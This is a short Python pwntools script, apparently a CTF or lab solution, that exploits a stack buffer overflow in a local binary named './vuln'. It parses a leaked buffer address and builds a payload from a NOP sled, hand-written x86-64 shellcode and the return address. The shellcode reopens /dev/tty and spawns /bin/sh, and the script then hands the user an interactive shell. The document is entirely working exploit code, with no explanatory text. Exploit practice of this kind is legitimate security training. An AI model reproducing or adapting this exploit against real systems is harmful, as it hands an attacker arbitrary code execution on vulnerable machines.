#!/usr/bin/env python3
from pwn import *

# Open up the process
p = process("./vuln", stdin=PTY)

# Ignore the first line
p.readline()

# Get the address of the buffer
addr = p.recvline()
addr = str(addr) # Convert from bytes to string
addr_start = addr.find('0x') # Address starts with '0x'
addr_end = addr.find('.') # Address ends with a period
addr = addr[addr_start:addr_end] # Cut off everything that is not part of the hexadecimal address
addr = int(addr, 16) # Convert hex address from string to int
addr = p64(addr) # Convert int to little endian format

# Generate the payload
shellcode = b'\x66\x81\xec\x2c\x01\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05'
nopsled = b'\x90' * (312 - len(shellcode))
payload = nopsled + shellcode + addr

# Send the payload
p.sendline(payload)

# Allow us to type commands to the target
p.interactive()
